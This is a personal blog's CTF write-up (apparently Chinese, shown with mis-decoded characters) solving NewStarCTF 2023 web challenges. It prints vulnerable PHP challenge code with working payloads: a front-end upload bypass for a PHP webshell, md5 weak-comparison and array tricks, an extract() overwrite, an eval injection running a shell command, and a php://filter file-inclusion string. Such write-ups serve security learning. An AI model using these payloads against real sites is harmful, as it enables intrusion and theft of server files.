<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>å¤ç°è®¡åˆ’â€”â€”NewStarCTF 2023 | HvAng's Nests</title><meta name="author" content="HvAng"><meta name="copyright" content="HvAng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="äº”ä¸€å¼€è‚ï¼Œä¸Šå­¦æœŸå¤ªæ‘†çƒ‚äº†ï¼Œæ‰“äº†ä¸¤å‘¨å°±æ‰“ä¸åŠ¨äº†ï¼Œä¸æ‰“äº†ï¼Œè¿™æ¬¡ä¸€å®šè¦èµ¢å›æ¥ï¼Œä¼šè¤çš„ Webweek1æ³„æ¼çš„ç§˜å¯†æŸ¥çœ‹&#x2F;robots.txtå’Œ&#x2F;www.zip Begin of UploadæŸ¥çœ‹å‰ç«¯ä»£ç  function validateForm() &#123;            var fileInput &#x3D; document.getElementById(&quot;file&quot;);">
<meta property="og:type" content="article">
<meta property="og:title" content="å¤ç°è®¡åˆ’â€”â€”NewStarCTF 2023">
<meta property="og:url" content="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/index.html">
<meta property="og:site_name" content="HvAng&#39;s Nests">
<meta property="og:description" content="äº”ä¸€å¼€è‚ï¼Œä¸Šå­¦æœŸå¤ªæ‘†çƒ‚äº†ï¼Œæ‰“äº†ä¸¤å‘¨å°±æ‰“ä¸åŠ¨äº†ï¼Œä¸æ‰“äº†ï¼Œè¿™æ¬¡ä¸€å®šè¦èµ¢å›æ¥ï¼Œä¼šè¤çš„ Webweek1æ³„æ¼çš„ç§˜å¯†æŸ¥çœ‹&#x2F;robots.txtå’Œ&#x2F;www.zip Begin of UploadæŸ¥çœ‹å‰ç«¯ä»£ç  function validateForm() &#123;            var fileInput &#x3D; document.getElementById(&quot;file&quot;);">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hvang10.github.io/img/favicon.png">
<meta property="article:published_time" content="2024-05-10T13:25:48.000Z">
<meta property="article:modified_time" content="2024-05-20T18:50:51.139Z">
<meta property="article:author" content="HvAng">
<meta property="article:tag" content="Web-learn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hvang10.github.io/img/favicon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'å¤ç°è®¡åˆ’â€”â€”NewStarCTF 2023',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-21 02:50:51'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="HvAng's Nests" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx.zhimg.com/80/v2-58d0f84fe61e154aa6095a9cbe2b1b7a_1440w.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="HvAng's Nests"><span class="site-name">HvAng's Nests</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">å¤ç°è®¡åˆ’â€”â€”NewStarCTF 2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-05-10T13:25:48.000Z" title="Created 2024-05-10 21:25:48">2024-05-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-05-20T18:50:51.139Z" title="Updated 2024-05-21 02:50:51">2024-05-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">22.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>114mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="å¤ç°è®¡åˆ’â€”â€”NewStarCTF 2023"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://picx.zhimg.com/80/v2-0200aa69c36fdd722172c0a2b0dfdb39_1440w.png" alt=""><br>äº”ä¸€å¼€è‚ï¼Œä¸Šå­¦æœŸå¤ªæ‘†çƒ‚äº†ï¼Œæ‰“äº†ä¸¤å‘¨å°±æ‰“ä¸åŠ¨äº†ï¼Œä¸æ‰“äº†ï¼Œè¿™æ¬¡ä¸€å®šè¦èµ¢å›æ¥ï¼Œä¼šè¤çš„</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h3><p><code>æŸ¥çœ‹/robots.txtå’Œ/www.zip</code></p>
<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>æŸ¥çœ‹å‰ç«¯ä»£ç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> allowedExtensions = [<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">            <span class="keyword">var</span> fileExtension = file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>().<span class="title function_">toLowerCase</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;Please select a file to upload.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">includes</span>(fileExtension)) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;é”™è¯¯çš„æ‹“å±•åï¼Œåªå…è®¸ä¸Šä¼ : JPG, JPEG, PNG, GIF&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬<br>æœ‰å‰ç«¯æ£€æµ‹ï¼ŒæŠ“ä¸ªåŒ…æ”¹ä¸€ä¸‹åç¼€<br>å¯ä»¥ä¸Šä¼ <code>1.jpg</code>ï¼Œç„¶åæŠ“åŒ…æ”¹ä¸º<code>1.php</code>ï¼Œè®¿é—®<code>url/upload/1.php</code>ï¼Œç„¶åå‘½ä»¤æ‰§è¡Œ<br>æˆ–è€…ç¦ç”¨js(å› ä¸ºæ˜¯å‰ç«¯çš„æ£€æµ‹)ï¼Œä¸Šä¼ phpæ–‡ä»¶</p>
<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: url/?ctf=1</span><br><span class="line">POST: secret=n3wst4rCTF2023g00000d</span><br><span class="line">cookie: power=ctfer</span><br><span class="line">User Agent: NewStarCTF2023</span><br><span class="line">Referer: newstarctf.com</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>éœ€è¦ä¼ å…¥<code>number1å’Œnumber2</code><br><code>url/?number1=1</code>è§¦å‘debug(ç›¸å½“äº<code>number2=null</code>)<br>æŸ¥çœ‹<code>app.py</code>æ˜¯è®¡ç®—<code>number1+number2</code>ï¼Œæ‰€ä»¥ä¼ å€¼ä¸æ˜¯æ•°å­—çš„å³å¯è§¦å‘debug</p>
<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5å¼±æ¯”è¾ƒ</span><br><span class="line">æ•°ç»„ç»•è¿‡</span><br><span class="line">key5ä½œæ¯”è¾ƒæ—¶é‡å­—æ¯åœæ­¢æˆªå–</span><br><span class="line">æœ€åä¸€ä¸ªå˜é‡è¦†ç›–(<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);)</span><br><span class="line">url/?key1=EEIZDOI&amp;key2=s214587387a&amp;key4[]=<span class="number">1</span>&amp;key5=<span class="number">2024</span>e</span><br><span class="line">post: key3[]=<span class="number">1</span>&amp;flag5=.</span><br></pre></td></tr></table></figure>
<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çˆ†ç ´ä¸€ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000000</span>):</span><br><span class="line">    a = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> a[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST: password=<span class="number">114514</span>&amp;e[v.a.l=<span class="keyword">echo</span> `tac /f*`;</span><br></pre></td></tr></table></figure>
<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>å…ˆæ³¨å†Œä¸ªæ™®é€šè´¦æˆ·ï¼Œå‘ç°æ²¡æœ‰ç”¨<br><code>Ctrl c</code>è¿›å…¥shellï¼Œ<code>Ctrl d</code>é€€å‡ºshell</p>
<p>çˆ†ç ´ä¸€ä¸‹<code>admin</code>çš„å¯†ç ï¼Œæ³¨æ„å¯†ç æ˜¯MD5åŠ å¯†çš„ï¼Œæ‰€ä»¥çˆ†ç ´æ—¶è¦åŠ ä¸Š</p>
<p><img src="https://picx.zhimg.com/80/v2-854cca1d203a83f8de8fedb139828f63_1440w.png" alt=""></p>
<p>ä¿®æ”¹å¯†ç é‡æ–°å‘åŒ…ï¼Œå‘ç°äº†302é‡å®šå‘åŒ…</p>
<p><img src="https://picx.zhimg.com/80/v2-ed97e0bd2f5790466972f2568f4e62bf_1440w.png" alt=""></p>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h3><p>æŸ¥çœ‹jsæ–‡ä»¶ï¼Œæœç´¢<code>score</code>ï¼Œå‘ç°</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gameover</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (gameScore &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> response = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">        <span class="title function_">alert</span>(response.<span class="property">message</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> data = &#123;</span><br><span class="line">      <span class="attr">score</span>: gameScore,</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;æˆç»©ï¼š&#x27;</span> + gameScore);</span><br><span class="line">  gameScore = <span class="number">0</span>;</span><br><span class="line">  curPhase = <span class="variable constant_">PHASE_READY</span>;</span><br><span class="line">  hero = <span class="literal">null</span>;</span><br><span class="line">  hero = <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ§åˆ¶å°ä¼ å‚ï¼Œ<code>gameScore=10000000000</code><br>æˆ–è€…ä½¿ç”¨bpæ¥POSTä¸€ä¸ªjsonæ ¼å¼çš„åˆ†æ•°ï¼Œ<code>&quot;score&quot;:10000000000</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /api.php HTTP/1.1</span><br><span class="line">Host: 6bdf352d-7431-499b-ad80-22eb7f582878.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">If-Modified-Since: Sun, 26 Mar 2023 07:18:44 GMT</span><br><span class="line">If-None-Match: &quot;2cb-5f7c86fc11d00-gzip&quot;</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;score&quot;:10000000000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>base64</code>å’Œ<code>rot13</code>è¿™ä¸¤ä¸ªå¸¸è§çš„è¿‡æ»¤å™¨è¢«banäº†<br>éšä¾¿æ‰¾éƒ½ä¸€å¤§å †<br><code>url/?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p>
